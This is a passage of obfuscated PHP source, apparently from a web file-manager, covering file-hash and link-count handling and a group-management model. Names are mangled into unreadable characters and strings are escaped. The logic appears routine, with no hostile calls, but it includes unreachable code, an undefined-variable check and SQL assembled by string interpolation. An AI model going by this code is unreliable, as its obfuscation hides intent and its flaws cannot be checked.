¼¡ûÆ¯[$ş·Š™¡ş[87]]; $ Ô­…¨ = $ş·Š™¡ş[2046] . $ ¼¡ûÆ¯[$ş·Š™¡ş[541]]; TaskQueue::add($ş·Š™¡ş[2047], $ÕñáÆÀ, $Ù­¦Ô¡ş, $ Ô­…¨); } public function fileMd5Set($‰ó¢Àë€, $¤Ÿ‘èµ) { $ÁÕ±Ş´¤ =& $_SERVER[íïàËŸë]; $¢İæ¡Ÿª = $this->find($‰ó¢Àë€); if (!$¢İæ¡Ÿª || $¢İæ¡Ÿª[$ÁÕ±Ş´¤[547]]) { return; } $î¬Ù‘‹« = IO::hashMd5($¤Ÿ‘èµ); if (!$î¬Ù‘‹«) { return $ÁÕ±Ş´¤[12]; } $this->where(array($ÁÕ±Ş´¤[541] => $‰ó¢Àë€))->save(array($ÁÕ±Ş´¤[547] => $î¬Ù‘‹«)); } public function addFileMake($§ï¶ÇÒÁ, $º¥¨®Í°, $ö“Ëßªú, $†¤‹Æ´, $çĞ§”£, $“³îŠìÚ) { $¨Œ÷¯ó =& $_SERVER[íïàËŸë]; $ìä˜È€û = $this->createFileName($çĞ§”£, $ö“Ëßªú, $†¤‹Æ´); $šæ±ˆ…™ = get_path_father($ìä˜È€û); $ºŒóÕ»€ = get_path_this($ìä˜È€û); if ($“³îŠìÚ) { $ËØäŒ² = IO::move($§ï¶ÇÒÁ, $šæ±ˆ…™, !1, $ºŒóÕ»€); } else { $ËØäŒ² = IO::copy($§ï¶ÇÒÁ, $šæ±ˆ…™, !1, $ºŒóÕ»€); } if (!$ËØäŒ²) { return !1; } $é€›¢Ñ = KodIO::defaultDriver(); $®íïûàâ = array($¨Œ÷¯ó[617] => $º¥¨®Í°, $¨Œ÷¯ó[2041] => 1, $¨Œ÷¯ó[494] => $çĞ§”£, $¨Œ÷¯ó[891] => $é€›¢Ñ[$¨Œ÷¯ó[475]], $¨Œ÷¯ó[495] => $ìä˜È€û, $¨Œ÷¯ó[2042] => $ö“Ëßªú, $¨Œ÷¯ó[2043] => $†¤‹Æ´); return $®íïûàâ; } public function addFileCheckExist($–¤´Ê¿ö, $¦¤»ï , $¨İÙšúĞ) { $áùÑˆ…Ï =& $_SERVER[íïàËŸë]; $úÊãµ¯Ã = $this->findByHash($–¤´Ê¿ö, $¦¤»ï ); if (!$úÊãµ¯Ã) { return !1; } $œÇîÅ…Ç = array($áùÑˆ…Ï[2041] => intval($úÊãµ¯Ã[$áùÑˆ…Ï[2048]]) + 1, $áùÑˆ…Ï[617] => $¨İÙšúĞ); $this->where(array($áùÑˆ…Ï[542] => $úÊãµ¯Ã[$áùÑˆ…Ï[541]]))->save($œÇîÅ…Ç); return $úÊãµ¯Ã; } public function remove($ÂŞÆ»ä) { $this->linkCountChange($ÂŞÆ»ä, !1); $this->clearEmpty(); return !0; } public function linkAdd($‚ÅÔãİÓ) { $this->linkCountChange($‚ÅÔãİÓ, !0); } public function linkCountChange($ªŒÏÙ·´, $¼è´Íœ) { $é¬õõÖå =& $_SERVER[íïàËŸë]; if (!$ªŒÏÙ·´) { return; } if (!is_array($ªŒÏÙ·´)) { $ªŒÏÙ·´ = array($ªŒÏÙ·´); } $ü’¦‹«ª = array(); foreach ($ªŒÏÙ·´ as $à³ŒÎ¥³) { $¼ãó±Î‹ = $à³ŒÎ¥³ . $é¬õõÖå[12]; if (!$ü’¦‹«ª[$¼ãó±Î‹]) { $ü’¦‹«ª[$¼ãó±Î‹] = 0; } $ü’¦‹«ª[$¼ãó±Î‹]++; } $öÚíşƒ¹ = array(); foreach ($ü’¦‹«ª as $à³ŒÎ¥³ => $ŸÆÂìú) { $¼ãó±Î‹ = $ŸÆÂìú . $é¬õõÖå[12]; if (!$öÚíşƒ¹[$¼ãó±Î‹]) { $öÚíşƒ¹[$¼ãó±Î‹] = array(); } $öÚíşƒ¹[$¼ãó±Î‹][] = $à³ŒÎ¥³; } foreach ($öÚíşƒ¹ as $ŸÆÂìú => $€ƒò®¾½) { if (!$€ƒò®¾½) { continue; } $ŸÆÂìú = $¼è´Íœ ? $ŸÆÂìú : -intval($ŸÆÂìú); $¼¯±ËìÉ = array($é¬õõÖå[541] => array($é¬õõÖå[7], $€ƒò®¾½)); if ($ŸÆÂìú < 0) { $¼¯±ËìÉ[$é¬õõÖå[2048]] = array($é¬õõÖå[1104], abs($ŸÆÂìú)); } $this->where($¼¯±ËìÉ)->setAdd($é¬õõÖå[2048], $ŸÆÂìú); } } public function findByHash($™…æèú, $À¯ï†Ô = false) { $öõ„—êö =& $_SERVER[íïàËŸë]; if (!$™…æèú && !$À¯ï†Ô) { return !1; } $ªäÜä®­ = array($öõ„—êö[2042] => $™…æèú); if ($À¯ï†Ô) { $ªäÜä®­ = array($öõ„—êö[2043] => $À¯ï†Ô); } return $this->order($öõ„—êö[2049])->where($ªäÜä®­)->find(); } public function clearEmpty($ÍÇ£ò‚Š = 0) { $ó œô ç =& $_SERVER[íïàËŸë]; $ùÊ…æ§¢ = time() - 3600 * 24 * $ÍÇ£ò‚Š; $·í˜ÍÉú = $ó œô ç[2050] . $ùÊ…æ§¢; $åó«ÁûÜ = $this->where($·í˜ÍÉú)->select(); if (!$åó«ÁûÜ) { return; } $ç…°Ú– = new Task($ó œô ç[2051], $ó œô ç[12], count($åó«ÁûÜ)); foreach ($åó«ÁûÜ as $ıÔŞ“) { $ç…°Ú–->update(1); $this->resetFile($ıÔŞ“); } $ç…°Ú–->end(); } public function resetFile($Æá–…) { $ĞçÕšÆä =& $_SERVER[íïàËŸë]; $åœ§Ç‰— = array($ĞçÕšÆä[542] => $Æá–…[$ĞçÕšÆä[541]]); $¨Ç›êŒ´ = Model($ĞçÕšÆä[1428])->where($åœ§Ç‰—)->count(); $™ÁÕöô± = Model($ĞçÕšÆä[2052])->where($åœ§Ç‰—)->count(); $ìêªŸÜÇ = intval($¨Ç›êŒ´) + intval($™ÁÕöô±); if ($ìêªŸÜÇ == 0) { IO::remove($Æá–…[$ĞçÕšÆä[87]]); Model($ĞçÕšÆä[2053])->delete($Æá–…[$ĞçÕšÆä[541]]); $this->where($åœ§Ç‰—)->delete(); $this->metaSet($Æá–…[$ĞçÕšÆä[541]], null, null); write_log(ACTION . $ĞçÕšÆä[2054] . KodUser::id() . $ĞçÕšÆä[2055] . $Æá–…[$ĞçÕšÆä[541]] . $ĞçÕšÆä[2056] . $Æá–…[$ĞçÕšÆä[79]] . $ĞçÕšÆä[201] . $Æá–…[$ĞçÕšÆä[87]], $ĞçÕšÆä[2057]); return; } if ($Æá–…[$ĞçÕšÆä[2048]] != $ìêªŸÜÇ) { $this->where($åœ§Ç‰—)->save(array($ĞçÕšÆä[2041] => $ìêªŸÜÇ)); } } public function storageInfo($¶ÛÌ¤ïû = false) { $È¼¶¯›´ =& $_SERVER[íïàËŸë]; $¯õÅ½åã = $this->count() + 0.0; $ª…®¿‘ = 0; $ÆÉŸşì¥ = 1; $ºğ©ñ§ = 0; $¡éòñË = 5000; for ($…±×ø˜Ï = 0; $…±×ø˜Ï < $¯õÅ½åã; $…±×ø˜Ï = $…±×ø˜Ï + $¡éòñË) { $­»É«ä… = $this->limit($…±×ø˜Ï, $…±×ø˜Ï + $¡éòñË)->select(); foreach ($­»É«ä… as $ÉÆš—¡Å) { $ÆÉŸşì¥ += $ÉÆš—¡Å[$È¼¶¯›´[79]] * $ÉÆš—¡Å[$È¼¶¯›´[2048]]; $ª…®¿‘ += $ÉÆš—¡Å[$È¼¶¯›´[79]] * ($ÉÆš—¡Å[$È¼¶¯›´[2048]] - 1); $ºğ©ñ§ += $ÉÆš—¡Å[$È¼¶¯›´[2048]]; } } $”˜ ­¬Ï = array($È¼¶¯›´[2058] => $ÆÉŸşì¥, $È¼¶¯›´[2059] => $ª…®¿‘, $È¼¶¯›´[2060] => $ª…®¿‘ / $ÆÉŸşì¥, $È¼¶¯›´[83] => $¯õÅ½åã, $È¼¶¯›´[2061] => $ºğ©ñ§); return $”˜ ­¬Ï; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\x75\160"; protected $tableMeta = array("\x74\x61\x62\154\x65\116\141\x6d\x65" => "\147\162\x6f\x75\160\137\x6d\x65\x74\x61", "\155\x65\x74\141\x46\151\x65\x6c\144" => "\147\x72\157\x75\x70\111\104"); protected function cacheFunctionAlias($èßÅû²) { $µŸµª Ù =& $_SERVER[íïàËŸë]; return array($µŸµª Ù[2062] => array($èßÅû²[0], $µŸµª Ù[2063]), $µŸµª Ù[2064] => array($èßÅû²[0], $µŸµª Ù[2065])); } protected function getInfo($ûè±¶êÔ, $æãÑË· = false) { $ÑÆæñÑà = $this->getInfoSimple($ûè±¶êÔ); if (!$ÑÆæñÑà) { return !1; } if ($æãÑË·) { return $this->_listDataApplyItem($ÑÆæñÑà); } return $this->cacheFunctionGet($_SERVER[íïàËŸë][2066], $ûè±¶êÔ); } protected function getInfoSimple($Šø¦æú¨, $‘µî±ÚÁ = false) { $¸ÖÈÓùŞ =& $_SERVER[íïàËŸë]; if ($‘µî±ÚÁ) { $´‰åÎ­¤ = array($¸ÖÈÓùŞ[1980] => intval($Šø¦æú¨)); $Òœë‹˜¨ = $this->where($´‰åÎ­¤)->find(); return is_array($Òœë‹˜¨) ? $Òœë‹˜¨ : array(); } return $this->cacheFunctionGet($¸ÖÈÓùŞ[2067], $Šø¦æú¨); } protected function groupAdd($ôñ×Šõí) { $Æâã¨ş =& $_SERVER[íïàËŸë]; if (!$ôñ×Šõí[$Æâã¨ş[192]] && isset($ôñ×Šõí[$Æâã¨ş[1980]]) && $ôñ×Šõí[$Æâã¨ş[1980]] == 1) { if ($‚Õ¸èÎá = $this->getInfoSimple($ôñ×Šõí[$Æâã¨ş[1980]], !0)) { return $ôñ×Šõí[$Æâã¨ş[1980]]; } } else { $‚Õ¸èÎá = $this->getInfoSimple($ôñ×Šõí[$Æâã¨ş[192]]); if (!$‚Õ¸èÎá) { return !1; } } $ÇÊßçì‰ = $Æâã¨ş[594]; if ($‚Õ¸èÎá[$Æâã¨ş[584]]) { $ÇÊßçì‰ = $‚Õ¸èÎá[$Æâã¨ş[584]] . $‚Õ¸èÎá[$Æâã¨ş[1980]] . $Æâã¨ş[50]; } $ÂóıÇÛË = array($Æâã¨ş[494] => $this->groupNameAuto($ôñ×Šõí[$Æâã¨ş[192]], $ôñ×Šõí[$Æâã¨ş[32]]), $Æâã¨ş[477] => $ôñ×Šõí[$Æâã¨ş[192]], $Æâã¨ş[652] => $ÇÊßçì‰, $Æâã¨ş[2068] => $ôñ×Šõí[$Æâã¨ş[1967]], $Æâã¨ş[2069] => 0, $Æâã¨ş[1984] => 0); if (isset($ôñ×Šõí[$Æâã¨ş[2004]])) { $ÂóıÇÛË[$Æâã¨ş[2004]] = $ôñ×Šõí[$Æâã¨ş[2004]]; } else { $ïš”“Í´ = $this->max($Æâã¨ş[2004]); if (!$ïš”“Í´) { $ïš”“Í´ = 0; } $ÂóıÇÛË[$Æâã¨ş[2004]] = $ïš”“Í´ + 1; } if (!empty($ôñ×Šõí[$Æâã¨ş[1980]])) { $ÂóıÇÛË[$Æâã¨ş[1980]] = $ôñ×Šõí[$Æâã¨ş[1980]]; } $Ê½Æöïá = $this->add($ÂóıÇÛË); $this->setNamePinyin($Ê½Æöïá, $ÂóıÇÛË[$Æâã¨ş[32]]); if (isset($ôñ×Šõí[$Æâã¨ş[2070]])) { $this->metaSet($Ê½Æöïá, array($Æâã¨ş[2070] => $ôñ×Šõí[$Æâã¨ş[2070]], $Æâã¨ş[2071] => $ôñ×Šõí[$Æâã¨ş[2071]])); unset($ôñ×Šõí[$Æâã¨ş[2070]]); unset($ôñ×Šõí[$Æâã¨ş[2071]]); } Model($Æâã¨ş[1428])->groupRootAdd($Ê½Æöïá); $this->_clearCache($ôñ×Šõí[$Æâã¨ş[192]]); return $Ê½Æöïá; } protected function groupEdit($âÂè—ĞÑ, $ØìÒÔè¡) { $š–”ˆÍ¡ =& $_SERVER[íïàËŸë]; $èü«ÍîÇ = $this->getInfoSimple($âÂè—ĞÑ); if (!$èü«ÍîÇ) { return !1; } if (!empty($ØìÒÔè¡[$š–”ˆÍ¡[192]])) { $Û¡šÖ‚± = $this->getInfoSimple($ØìÒÔè¡[$š–”ˆÍ¡[192]]); if (!$Û¡šÖ‚±) { return !1; } if ($èü«ÍîÇ[$š–”ˆÍ¡[1980]] == $Û¡šÖ‚±[$š–”ˆÍ¡[1980]]) { return !1; } if ($ØìÒÔè¡[$š–”ˆÍ¡[192]] != $èü«ÍîÇ[$š–”ˆÍ¡[192]]) { if ($Û¡šÖ‚±[$š–”ˆÍ¡[584]] !== $èü«ÍîÇ[$š–”ˆÍ¡[584]] && strpos($Û¡šÖ‚±[$š–”ˆÍ¡[584]], $èü«ÍîÇ[$š–”ˆÍ¡[584]] . $èü«ÍîÇ[$š–”ˆÍ¡[1980]] . $š–”ˆÍ¡[50]) === 0) { return !1; } $ØìÒÔè¡[$š–”ˆÍ¡[652]] = $Û¡šÖ‚±[$š–”ˆÍ¡[584]] . $ØìÒÔè¡[$š–”ˆÍ¡[192]] . $š–”ˆÍ¡[50]; $this->_changeChildLevel($èü«ÍîÇ, $Û¡šÖ‚±); $this->_clearCache($Û¡šÖ‚±[$š–”ˆÍ¡[1980]]); $this->_clearCache($èü«ÍîÇ[$š–”ˆÍ¡[192]]); } } if (isset($ØìÒÔè¡[$š–”ˆÍ¡[32]])) { $this->setNamePinyin($âÂè—ĞÑ, $ØìÒÔè¡[$š–”ˆÍ¡[32]]); } if (isset($ØìÒÔè¡[$š–”ˆÍ¡[2070]])) { $this->metaSet($âÂè—ĞÑ, array($š–”ˆÍ¡[2070] => $ØìÒÔè¡[$š–”ˆÍ¡[2070]], $š–”ˆÍ¡[2071] => $ØìÒÔè¡[$š–”ˆÍ¡[2071]])); unset($ØìÒÔè¡[$š–”ˆÍ¡[2070]]); unset($ØìÒÔè¡[$š–”ˆÍ¡[2071]]); } $this->_clearChildrenCache($èü«ÍîÇ); return $this->where(array($š–”ˆÍ¡[2072] => $âÂè—ĞÑ))->save($ØìÒÔè¡); } private function _clearChildrenCache($Ğ¸Š•¢) { $Ü‡’àÂ¿ =& $_SERVER[íïàËŸë]; $Ìñ‹‰‚Ó = array($Ü‡’àÂ¿[652] => array($Ü‡’àÂ¿[612], $Ğ¸Š•¢[$Ü‡’àÂ¿[584]] . $Ğ¸Š•¢[$Ü‡’àÂ¿[1980]] . $Ü‡’àÂ¿[613])); $»•ïÏŸ¼ = $this->field($Ü‡’àÂ¿[1980])->where($Ìñ‹‰‚Ó)->select(); foreach ($»•ïÏŸ¼ as $‹æÑ’ Ê) { $this->_clearCache($‹æÑ’ Ê[$Ü‡’àÂ¿[1980]]); } } private function _clearCache($ÆÙ‚º¡) { $ôÚ…ÇùØ =& $_SERVER[íïàËŸë]; $this->cacheFunctionClear($ôÚ…ÇùØ[2066], $ÆÙ‚º¡); $this->cacheFunctionClear($ôÚ…ÇùØ[2067], $ÆÙ‚º¡); } private function _changeChildLevel($Ã‘£„ÊÄ, $âú·å€å, $‰ŒİÀ˜ = false) { $ ÛŸìŠ =& $_SERVER[íïàËŸë]; $±ÙĞˆà = $Ã‘£„ÊÄ[$ ÛŸìŠ[584]] . $Ã‘£„ÊÄ[$ ÛŸìŠ[1980]] . $ ÛŸìŠ[50]; $İ‡¯šš÷ = $âú·å€å[$ ÛŸìŠ[584]] . $âú·å€å[$ ÛŸìŠ[1980]] . $ ÛŸìŠ[50] . $Ã‘£„ÊÄ[$ ÛŸìŠ[1980]] . $ ÛŸìŠ[50]; if ($‰ŒİÀ˜) { $İ‡¯šš÷ = $âú·å€å[$ ÛŸìŠ[584]] . $âú·å€å[$ ÛŸìŠ[1980]] . $ ÛŸìŠ[50]; } $ÛÉ¢âĞ = array($ ÛŸìŠ[652] => array($ ÛŸìŠ[612], $Ã‘£„ÊÄ[$ ÛŸìŠ[584]] . $Ã‘£„ÊÄ[$ ÛŸìŠ[1980]] . $ ÛŸìŠ[613])); $›Æò÷¯± = array($ ÛŸìŠ[652] => array($ ÛŸìŠ[661], "\162\x65\160\x6c\141\x63\x65\50\x70\x61\162\145\x6e\x74\x4c\x65\x76\145\x6c\54\x27{$±ÙĞˆà}\47\54\x27{$İ‡¯šš÷}\x27\51")); $this->_clearChildrenCache($Ã‘£„ÊÄ); $this->where($ÛÉ¢âĞ)->data($›Æò÷¯±)->save(); } public function setNamePinyin($âûÇ‚¶, $ù¾Àõ¬Ö = false) { $—Ëá‚Ù™ =& $_SERVER[íïàËŸë]; if (!$ù¾Àõ¬Ö) { $“¯µ–Â® = $this->getInfoSimple($âûÇ‚¶); $ù¾Àõ¬Ö = $“¯µ–Â®[$—Ëá‚Ù™[32]]; } if (!Input::check($ù¾Àõ¬Ö, $—Ëá‚Ù™[655])) { $this->metaSet($âûÇ‚¶, $—Ëá‚Ù™[538], null); $this->metaSet($âûÇ‚¶, $—Ëá‚Ù™[537], null); return; } $Ù «¹Á‘ = array($—Ëá‚Ù™[538] => str_replace($—Ëá‚Ù™[53], $—Ëá‚Ù™[12], Pinyin::get($ù¾Àõ¬Ö)), $—Ëá‚Ù™[537] => Pinyin::get($ù¾Àõ¬Ö, $—Ëá‚Ù™[656])); $this->metaSet($âûÇ‚¶, $Ù «¹Á‘); } protected function groupStatus($­İ¸ûó®, $ıïä’†) { $‘’ª¬®© =& $_SERVER[íïàËŸë]; $ßÖ‘Ò©’ = $this->getInfoSimple($­İ¸ûó®); if (!$ßÖ‘Ò©’) { return !1; } $this->_clearCache($­İ¸ûó®); return $this->metaSet($­İ¸ûó®, $‘’ª¬®©[833], $ıïä’†); if ($ıïä’† == $‘’ª¬®©[91]) { $Ô˜éØĞ× = $this->parentLevelArray($ßÖ‘Ò©’[$‘’ª¬®©[584]]); } else { } $Ô˜éØĞ×[] = $ßÖ‘Ò©’[$‘’ª¬®©[1980]]; $Î·¡ £Ò = array(); foreach ($Ô˜éØĞ× as $­İ¸ûó®) { $Î·¡ £Ò[] = array($‘’ª¬®©[1980] => $­İ¸ûó®, $‘’ª¬®©[97] => $‘’ª¬®©[833], $‘’ª¬®©[450] => $ıïä’†); $this->_clearCache($­İ¸ûó®); } return Model($‘’ª¬®©[2073])->addAll($Î·¡ £Ò, array(), !0); } protected function groupRemove($«ªß§¾, $Äß›Çû = false) { $èı–”À‘ =& $_SERVER[íïàËŸë]; $³şÇ•ß = array($èı–”À‘[1980] => $«ªß§¾); $Œ‰®÷ö = $this->where($³şÇ•ß)->find(); if (!$Œ‰®÷ö || $Œ‰®÷ö[$èı–”À‘[192]] == 0) { return !1; } if (!$Äß›Çû) { $çƒô™Óï = $this->getInfoSimple($Œ‰®÷ö[$èı–”À‘[192]]); $this->_changeChildLevel($Œ‰®÷ö, $çƒô™Óï, !0); $this->where(array($èı–”À‘[192] => $«ªß§¾))->save(array($èı–”À‘[192] => $Œ‰®÷ö[$èı–”À‘[192]])); $this->_clearCache($çƒô™Óï[$èı–”À‘[1980]]); } Model($èı–”À‘[2073])->where($³şÇ•ß)->delete(); Model($èı–”À‘[2074])->where($³şÇ•ß)->delete(); Model($èı–”À‘[907])->groupRootRemove($«ªß§¾); $this->_clearCache($Œ‰®÷ö[$èı–”À‘[192]]); return $this->where($³şÇ•ß)->delete(); } protected function groupSort($§Ó’‚³ğ) { $ÆŸÎÏ¿ =& $_SERVER[íïàËŸë]; $é‰§Ã´„ = array(); foreach ($§Ó’‚³ğ as $ÄÔ«à©½ => $§îˆ„) { $é‰§Ã´„[] = array($ÆŸÎÏ¿[1980], $§îˆ„, $ÆŸÎÏ¿[2004], $ÄÔ«à©½ + 1); } $this->saveAll($é‰§Ã´„); } public function listData() { $•İ¹ŒÆŸ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($•İ¹ŒÆŸ[$_SERVER[íïàËŸë][445]]); return $•İ¹ŒÆŸ; } private function _makeOrder($ÆÜÁùÁ = '') { $Šß ³ÎÜ =& $_SERVER[íïàËŸë]; $Ã‘ûéã½ = array($Šß ³ÎÜ[1980], $Šß ³ÎÜ[32], $Šß ³ÎÜ[1969], $Šß ³ÎÜ[231]); $È±‡¾Åæ = array($Šß ³ÎÜ[523] => $Šß ³ÎÜ[524], $Šß ³ÎÜ[525] => $Šß ³ÎÜ[526]); $¼é†›½Ã = Input::get($Šß ³ÎÜ[530], $Šß ³ÎÜ[7], $Šß ³ÎÜ[1984], $Ã‘ûéã½); $±‰©õİš = Input::get($Šß ³ÎÜ[531], $Šß ³ÎÜ[7], $Šß ³ÎÜ[2075], array($Šß ³ÎÜ[2075], $Šß ³ÎÜ[525])); $±‰©õİš = $È±‡¾Åæ[$±‰©õİš]; $ÆÜÁùÁ = $ÆÜÁùÁ . "{$¼é†›½Ã}\x20{$±‰©õİš}\54\40\147\x72\x6f\x75\160\x49\x44\x20\141\163\x63"; return $this->order($ÆÜÁùÁ); } public function listChild($—Ìê™‡›) { $”ùì¼é =& $_SERVER[íïàËŸë]; $Àø‚¡“· = $this->where(array($”ùì¼é[192] => $—Ìê™‡›))->_makeOrder()->selectPage(200); $this->_listDataApply($Àø‚¡“·[$”ùì¼é[445]]); return $Àø‚¡“·; } public function listChildIds($¦Á¸İù‰) { $ë×¸÷ìã =& $_SERVER[íïàËŸë]; if (is_string($á²Ä˜·)) { $¦Á¸İù‰ = explode($ë×¸÷ìã[50], $¦Á¸İù‰); } $™Şá—„£ = $this->where(array($ë×¸÷ìã[1980] => array($ë×¸÷ìã[7], $¦Á¸İù‰)))->field($ë×¸÷ìã[2076])->select(); if (!$™Şá—„£) { return !1; } $×²çâ™ = array(); foreach ($™Şá—„£ as $ßÔÅæõó) { $×²çâ™[] = "\x73\x65\154\x65\x63\164\40\147\162\157\165\160\x49\104\x20\146\x72\157\x6d\x20\x60\x67\x72\x6f\x75\160\x60\40\x77\x68\x65\x72\145\40\x70\x61\162\145\x6e\164\114\145\166\145\154\40\154\x69\x6b\145\40\x27{$ßÔÅæõó[$ë×¸÷ìã[584]]}{$ßÔÅæõó[$ë×¸÷ìã[1980]]}\54\45\47"; } $×²çâ™ = implode($ë×¸÷ìã[2077], $×²çâ™); $™Şá—„£ = $this->query($×²çâ™); if (!$™Şá—„£) { return array(); } $¦Á¸İù‰ = array_to_keyvalue($™Şá—„£, $ë×¸÷ìã[12], $ë×¸÷ìã[1980]); return array_unique($¦Á¸İù‰); } public function listByID($¶‘ŒÊÈë) { $¢ÚÉØ İ =& $_SERVER[íïàËŸë]; if (!$¶‘ŒÊÈë) { return array(); } $Ú¶‰ÚÜ‚ = array($¢ÚÉØ İ[1980] => array($¢ÚÉØ İ[7], $¶‘ŒÊÈë)); $ûÀÔ¼ı¹ = $this->where($Ú¶‰ÚÜ‚)->select(); $ûÀÔ¼ı¹ = array_sort_keep($ûÀÔ¼ı¹, $¢ÚÉØ İ[1980], $¶‘ŒÊÈë); $this->_listDataApply($ûÀÔ¼ı¹); return $ûÀÔ¼ı¹; } public function listSearch($Îô€°ó÷) { $‚‡ûæ¹¿ =& $_SERVER[íïàËŸë]; $À†ªÏÛÏ = trim($Îô€°ó÷[$‚‡ûæ¹¿[2078]]); $•áË›Ø„ = explode($‚‡ûæ¹¿[53], $À†ªÏÛÏ); if (!$À†ªÏÛÏ || count($•áË›Ø„) == 1) { return $this->listSearchNow($Îô€°ó÷); } $ñ•Å¯¥Ö = array($‚‡ûæ¹¿[445] => array()); foreach ($•áË›Ø„ as $‡Åâ©µ) { if (!trim($‡Åâ©µ)) { continue; } $Îô€°ó÷[$‚‡ûæ¹¿[2078]] = $‡Åâ©µ; $Š°ÁÒ = $this->listSearchNow($Îô€°ó÷); $ñ•Å¯¥Ö[$‚‡ûæ¹¿[445]] = array_merge($ñ•Å¯¥Ö[$‚‡ûæ¹¿[445]], $Š°ÁÒ[$‚‡ûæ¹¿[445]]); } $ñ•Å¯¥Ö[$‚‡ûæ¹¿[445]] = array_unique_by_key($ñ•Å¯¥Ö[$‚‡ûæ¹¿[445]], $‚‡ûæ¹¿[1980]); $ñ•Å¯¥Ö[$‚‡ûæ¹¿[442]] = array($‚‡ûæ¹¿[443] => count($ñ•Å¯¥Ö[$‚‡ûæ¹¿[445]]), $‚‡ûæ¹¿[439] => 20, $‚‡ûæ¹¿[429] => 1, $‚‡ûæ¹¿[444] => 1); return $ñ•Å¯¥Ö; } public function listSearchNow($Í·ıüâû) { $ªÔÉö‚ =& $_SERVER[íïàËŸë]; $©¦íÒí½ = trim($Í·ıüâû[$ªÔÉö‚[2078]]); $ä¯æÔóË = isset($Í·ıüâû[$ªÔÉö‚[2079]]) ? $Í·ıüâû[$ªÔÉö‚[2079]] : !1; if (!trim($©¦íÒí½)) { return !1; } $©¦íÒí½ = str_replace($ªÔÉö‚[2080], $ªÔÉö‚[2081], $©¦íÒí½); $›ÓŸŠêæ = array($ªÔÉö‚[1980] => array($ªÔÉö‚[459], "{$©¦íÒí½}\45"), $ªÔÉö‚[32] => array($ªÔÉö‚[459], "\45{$©¦íÒí½}\45"), $ªÔÉö‚[1089] => $ªÔÉö‚[2082]); if ($ä¯æÔóË) { $™â®ÌÖ = $this->getInfoSimple($ä¯æÔóË); $Æ¿˜à´ø = $™â®ÌÖ[$ªÔÉö‚[584]] . $ä¯æÔóË . $ªÔÉö‚[613]; $›ÓŸŠêæ = array($›ÓŸŠêæ, array($ªÔÉö‚[584] => array($ªÔÉö‚[459], $Æ¿˜à´ø))); } $›ÓŸŠêæ = $this->parseWhereLike($›ÓŸŠêæ); $»Ú¦¥ë = $this->_makeOrder()->where($›ÓŸŠêæ)->selectPage(20); $»Ú¦¥ë = $»Ú¦¥ë ? $»Ú¦¥ë : array($ªÔÉö‚[445] => array(), $ªÔÉö‚[442] => array()); if (!$»Ú¦¥ë || count($»Ú¦¥ë[$ªÔÉö‚[445]]) < 5 && Input::check($©¦íÒí½, $ªÔÉö‚[394])) { $³Ë£¿¶Ï = $this->groupChildrenAll($ä¯æÔóË); $„ùÒ°Ğ¹ = $this->_searchFromMeta($ªÔÉö‚[537], $©¦íÒí½, 10, $³Ë£¿¶Ï); $½‹Š¯‡Ñ = $this->_searchFromMeta($ªÔÉö‚[538], $©¦íÒí½, 10, $³Ë£¿¶Ï); $†£ß€‘Í = array_merge($„ùÒ°Ğ¹, $½‹Š¯‡Ñ, $»Ú¦¥ë[$ªÔÉö‚[445]]); $»Ú¦¥ë[$ªÔÉö‚[445]] = array_unique_by_key($†£ß€‘Í, $ªÔÉö‚[1980]); $»Ú¦¥ë[$ªÔÉö‚[442]][$ªÔÉö‚[443]] = count($»Ú¦¥ë[$ªÔÉö‚[445]]); $»Ú¦¥ë[$ªÔÉö‚[442]][$ªÔÉö‚[444]] = ceil($»Ú¦¥ë[$ªÔÉö‚[442]][$ªÔÉö‚[443]] / $»Ú¦¥ë[$ªÔÉö‚[442]][$ªÔÉö‚[439]]); } $this->_listDataApply($»Ú¦¥ë[$ªÔÉö‚[445]]); return $»Ú¦¥ë; } protected function groupChildrenAll($£ßƒõİ) { $úòî²£å =& $_SERVER[íïàËŸë]; if (!$£ßƒõİ) { return !1; } if (!is_array($£ßƒõİ)) { $£ßƒõİ = array($£ßƒõİ); } $³´ËÔ‹‹ = $£ßƒõİ; foreach ($£ßƒõİ as $ëŠ£êÚ½) { $æÍÄâ‰ú = $this->getInfoSimple($ëŠ£êÚ½); $±ˆ¼Ì¬ = array($úòî²£å[584] => array($úòî²£å[459], $æÍÄâ‰ú[$úòî²£å[584]] . $ëŠ£êÚ½ . $úòî²£å[613])); $ï£Âø¼® = $this->field($úòî²£å[1980])->where($±ˆ¼Ì¬)->select(); $³´ËÔ‹‹ = array_merge($³´ËÔ‹‹, array_to_keyvalue($ï£Âø¼®, $úòî²£å[12], $úòî²£å[1980])); } return array_unique($³´ËÔ‹‹); } private function _searchFromMeta($ÚÔÃÕŸŒ, $Í·ìœìÚ, $üìºÃ£Î, $ğƒüƒƒğ) { $ˆ¶‘‡±õ =& $_SERVER[íïàËŸë]; $Í·ìœìÚ = strtolower($Í·ìœìÚ); $Öô®ò‡ = array($ˆ¶‘‡±õ[97] => $ÚÔÃÕŸŒ, $ˆ¶‘‡±õ[450] => array($ˆ¶‘‡±õ[459], "\x25{$Í·ìœìÚ}\x25")); $Öô®ò‡ = $this->parseWhereLike($Öô®ò‡); if ($ğƒüƒƒğ) { $Öô®ò‡[$ˆ¶‘‡±õ[1980]] = array($ˆ¶‘‡±õ[7], $ğƒüƒƒğ); } $¦ÃÇÔ = Model($ˆ¶‘‡±õ[2083])->where($Öô®ò‡)->limit($üìºÃ£Î)->select(); if (!$¦ÃÇÔ) { return array(); } $¦ÃÇÔ = array_to_keyvalue($¦ÃÇÔ, $ˆ¶‘‡±õ[12], $ˆ¶‘‡±õ[1980]); $âê¦ÍÕş = $this->where(array($ˆ¶‘‡±õ[2072] => array($ˆ¶‘‡±õ[7], $¦ÃÇÔ)))->select(); if (!$âê¦ÍÕş) { return array(); } return $âê¦ÍÕş; } protected function _listDataApplyItem($——œüÕ—) { $ËÚô¢‚† = array($——œüÕ—); $this->_listDataApply($ËÚô¢‚†); return $ËÚô¢‚†[0]; } protected function _listDataApply(&$éòœ°Í) { $´ï‡ŒŸĞ =& $_SERVER[íïàËŸë]; if (!$éòœ°Í) { return; } $˜ˆ¦Íö‰ = array_to_keyvalue($éòœ°Í, $´ï‡ŒŸĞ[12], $´ï‡ŒŸĞ[1980]); $this->_listAppendChildren($éòœ°Í); $this->_listAppendChildrenMember($éòœ°Í); $this->_listAppendMeta($éòœ°Í, $˜ˆ¦Íö‰); $this->_listAppendParent($éòœ°Í); $this->_listAppendSourceRoot($éòœ°Í, $˜ˆ¦Íö‰); } private function 